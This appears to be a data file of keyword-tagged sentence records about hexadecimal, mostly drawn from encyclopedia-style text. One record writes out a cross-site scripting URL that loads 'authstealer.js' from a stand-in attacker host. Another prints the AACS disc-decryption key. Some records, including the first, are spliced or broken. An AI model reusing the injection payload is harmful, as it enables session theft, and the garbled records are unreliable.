5|$|<b>Hexadecimal</b> is a base-16 {{numeral system}} {{used in the}} fields of {{computer}} programming and mathematics. The key is an ordinary number most widely known by its <b>hexadecimal</b> representation; in decimal notation, it is 13,256,278,887,989,457,651,018,865,901,401,704,640.|$|E
5|$|The {{following}} are the approximate colours of the Hong Kong flag in different colour models. It is listed by web colours in <b>hexadecimal</b> notation, CMYK equivalents*, dye colours, HSL equivalents, and Pantone equivalents.|$|E
5|$|PHP stores {{integers}} in a platform-dependent range, {{either a}} 64-bit or 32-bit signed integer {{equivalent to the}} C-language long type. Unsigned integers are converted to signed values in certain situations; this behavior {{is different from that}} of other programming languages. Integer variables can be assigned using decimal (positive and negative), octal, <b>hexadecimal,</b> and binary notations.|$|E
5|$|Software was {{distributed}} through print media; magazines and books. The reader would type the BASIC program listing {{into the computer}} by hand, run it, and could save it to tape for later use. Software distributed in this way was in general simpler and slower than its assembly language counterparts. Magazines printed long lists of checksummed <b>hexadecimal</b> digits with machine code games or tools.|$|E
5|$|On {{or about}} January 13, a title key was posted on pastebin.com {{in the form}} of a riddle, which was solved by {{entering}} terms into the Google search engine. By converting these results to <b>hexadecimal,</b> a correct key could be formed. Later that day, the first cracked HD DVD, Serenity, was uploaded on a private torrent tracker. The AACS LA confirmed on January 26 that the title keys on certain HD DVDs had been published without authorization.|$|E
5|$|The Programmer {{accessory}} {{had been}} {{mentioned in the}} earliest advertisement {{but it was not}} featured until March 1974. This was the same size as a desktop calculator and could hold 256 programming steps. (It could be expanded to 512 steps.) It was limited to emulating calculator key presses and simple sequence branching. The programming was done by entering <b>hexadecimal</b> key codes. The combination of the MITS 7440 calculator and the programmer was not nearly as sophisticated as the HP 9830 calculator but $400 for both kits was a fraction of the HP price.|$|E
5|$|A {{controversy}} surrounding the AACS cryptographic key arose in April 2007 when the Motion Picture Association of America and the Advanced Access Content System Licensing Administrator, LLC (AACS LA) began issuing {{cease and desist}} letters to websites publishing a 128-bit (16-byte) number, represented in <b>hexadecimal</b> as 09 F9 11 02 9D 74 E3 5B D8 41 56 C5 63 56 88 C0 is the number they tried to ban|accessdate=May 3, 2007|date=May 2, 2007|author=Nick Farrell|publisher=The Inquirer}} (commonly referred to as 09 F9), a cryptographic key for HD DVDs and Blu-ray Discs. The letters demanded the immediate removal of the key and any links to it, citing the anti-circumvention provisions of the United States Digital Millennium Copyright Act (DMCA).|$|E
5|$|The {{image of}} the maple leaf used on the flag was {{designed}} by Jacques Saint-Cyr; however, Jack Cook claims that this stylized eleven-point maple leaf was lifted from a copyrighted design owned by a Canadian craft shop in Ottawa. The colours 0/100/100/0 in the CMYK process, PMS 032 (flag red 100%), or PMS 485 (used for screens) in the Pantone colour specifier can be used when reproducing the flag. For the Federal Identity Program, the red tone of the standard flag has an RGB value of 255–0–0 (web <b>hexadecimal</b> #FF0000). In 1984, the National Flag of Canada Manufacturing Standards Act was passed to unify the manufacturing standards for flags used in both indoor and outdoor conditions.|$|E
25|$|The {{main source}} of {{problems}} was confusion between <b>hexadecimal</b> number encoding and binary-coded decimal encodings of numbers. Both <b>hexadecimal</b> and BCD encode the numbers 0–9 as 0x0–0x9. But BCD encodes the number 10 as 0x10, whereas <b>hexadecimal</b> encodes the number 10 as 0x0A; 0x10 interpreted as a <b>hexadecimal</b> encoding represents the number 16.|$|E
25|$|<b>Hexadecimal</b> numerals {{are widely}} used by {{computer}} system designers and programmers. As each <b>hexadecimal</b> digit represents four binary digits (bits), it allows a more human-friendly representation of binary-coded values. One <b>hexadecimal</b> digit represents a nibble (4 bits), which is half of an octet or byte (8 bits). For example, a single byte can have values ranging from 00000000 to 11111111 in binary form, but this may be more conveniently represented as 00 to FF in <b>hexadecimal.</b>|$|E
25|$|Binary may be {{converted}} to and from <b>hexadecimal</b> somewhat more easily. This is because the radix of the <b>hexadecimal</b> system (16) is a power of the radix of the binary system (2). More specifically, 16 = 24, so it takes four digits of binary to represent one digit of <b>hexadecimal,</b> {{as shown in the}} adjacent table.|$|E
25|$|A binary byte {{is usually}} {{expressed}} using two <b>hexadecimal</b> characters.|$|E
25|$|<b>Hexadecimal</b> {{constants}} are prefixed with {{a dollar}} sign ($), {{followed by the}} constant. ($B8000).|$|E
25|$|The {{examples}} {{refer to}} the storage {{in memory of the}} value. It uses <b>hexadecimal</b> notation.|$|E
25|$|This binary {{computer}} code {{can be made}} more human-readable by expressing it in <b>hexadecimal</b> as follows.|$|E
25|$|In {{contexts}} {{where the}} base is not clear, <b>hexadecimal</b> numbers can be ambiguous and confused with numbers expressed in other bases. There are several conventions for expressing values unambiguously. A numerical subscript (itself written in decimal) can give the base explicitly: 15910 is decimal 159; 15916 is <b>hexadecimal</b> 159, which is equal to 34510. Some authors prefer a text subscript, such as 159decimal and 159hex, or 159d and 159h.|$|E
25|$|In the C {{programming}} language, 'x' {{preceded by}} zero (0x or 0X) {{is used to}} denote <b>hexadecimal</b> literal values.|$|E
25|$|For {{external}} use by computer specialists, this binary representation is sometimes {{presented in the}} related octal or <b>hexadecimal</b> systems.|$|E
25|$|The {{user can}} {{configure}} the registry to allow {{use of the}} Alt key with the numeric plus key to type the <b>hexadecimal</b> Unicode value.|$|E
25|$|These test vectors are not official, but {{convenient}} for anyone testing their own RC4 program. The keys and plaintext are ASCII, the keystream and ciphertext are in <b>hexadecimal.</b>|$|E
25|$|Note: HTML numeric {{character}} references {{can be in}} decimal format (&#DDDD;) or <b>hexadecimal</b> format (&#xHHHH;). For example, &#1813; and &#x0715; (1813 in decimal) both represent U+0715 SYRIAC LETTER DALATH.|$|E
25|$|She {{makes the}} URL http://bobssite.org?q=puppies<script%20src="http://mallorysevilsite.com/authstealer.js">. She {{could choose to}} convert the ASCII {{characters}} into <b>hexadecimal</b> format, such as http://bobssite.org?q=puppies%3Cscript%2520src%3D%22http%3A%2F%2Fmallorysevilsite.com%2Fauthstealer.js%22%3E%3C%2Fscript%3E, so that human readers cannot immediately decipher the malicious URL.|$|E
25|$|The least {{significant}} byte (LSB) value, 0Dh, is at {{the lowest}} address. The other bytes follow in increasing order of significance. This is akin to right-to-left reading in <b>hexadecimal</b> order.|$|E
25|$|In URIs (including URLs), {{character}} codes are written as <b>hexadecimal</b> pairs prefixed with %: http://www.example.com/name%20with%20spaces where %20 is the space (blank) character, ASCII code point 20 in hex, 32 in decimal.|$|E
25|$|The most {{significant}} byte (MSB) value, 0Ah, {{is at the}} lowest address. The other bytes follow in decreasing order of significance. This is akin to left-to-right reading in <b>hexadecimal</b> order.|$|E
25|$|In computers, the {{component}} values are often stored as integer {{numbers in the}} range 0 to 255, the range that a single 8-bit byte can offer. These are often represented as either decimal or <b>hexadecimal</b> numbers.|$|E
25|$|The decimal {{expansion}} of an irrational number never repeats or terminates (essentially, that is repeating zeroes), unlike any rational number does. Similarly for binary, octal or <b>hexadecimal</b> expansions, {{and in general}} for expansions in every positional notation with natural bases.|$|E
25|$|Historically, several number bases {{have been}} used for {{representing}} floating-point numbers, with base two (binary) being the most common, followed by base ten (decimal), and other less common varieties, such as base sixteen (<b>hexadecimal</b> notation), and even base three (see Setun).|$|E
25|$|Any IPv6 {{address that}} begins with the 2002::/16 prefix (in other words, any address with the first two octets of 2002 <b>hexadecimal)</b> {{is known as a}} 6to4 address, as opposed to a native IPv6 address which does not {{systematically}} use transition technologies.|$|E
25|$|Since UTF-8 uses {{groups of}} six bits, it is {{sometimes}} useful to use octal notation which uses 3-bit groups. With a calculator which can convert between <b>hexadecimal</b> and octal it can be easier to manually create or interpret UTF-8 compared with using binary.|$|E
25|$|Although the Graphics Control Extension block {{declares}} {{color index}} 16 (<b>hexadecimal</b> 10) to be transparent, that index {{is not used}} in the image. The only color indexes appearing in the image data are decimal 40 and 255, which the Global Color Table maps to black and white, respectively.|$|E
25|$|Colors can {{be applied}} to all visible SVG elements, either {{directly}} or via fill, stroke, and other properties. Colors are specified {{in the same way as}} in CSS2, i.e. using names like black or blue, in <b>hexadecimal</b> such as #2f0 or #22ff00, in decimal like rgb(255,255,127), or as percentages of the form rgb(100%,100%,50%).|$|E
25|$|In {{mathematics}} and computing, <b>hexadecimal</b> (also base , or hex) is a positional numeral {{system with a}} radix, or base, of 16. It uses sixteen distinct symbols, most often the symbols 0–9 to represent values zero to nine, and A, B, C, D, E, F (or alternatively a, b, c, d, e, f) to represent values ten to fifteen.|$|E
25|$|In Jorge Luis Borges' {{short story}} Tlön, Uqbar, Orbis Tertius Herbert Ashe, a melancholy English engineer, {{working for the}} Southern Argentine Railway company, is {{converting}} a duodecimal number system to a <b>hexadecimal</b> system. He leaves behind on his death in 1937 a manuscript Orbis Tertius that posthumously identifies {{him as one of}} the anonymous authors of the encyclopaedia of Tlön.|$|E
25|$|In XML and XHTML, {{characters}} can {{be expressed}} as <b>hexadecimal</b> numeric character references using the notation &#xcode;, where the x denotes that code is a hex code point (of 1- to 6-digits) assigned to the character in the Unicode standard. Thus &#x2019; represents the right single quotation mark (’), Unicode code point number 2019 in hex, 8217 (thus &#8217; in decimal).|$|E
25|$|In computers, {{the main}} numeral systems {{are based on}} the {{positional}} system in base2 (binary numeral system), with two binary digits, 0 and 1. Positional systems obtained by grouping binary digits by three (octal numeral system) or four (<b>hexadecimal</b> numeral system) are commonly used. For very large integers, bases232 or 264 (grouping binary digits by 32 or 64, the length of the machine word) are used, as, for example, in GMP.|$|E
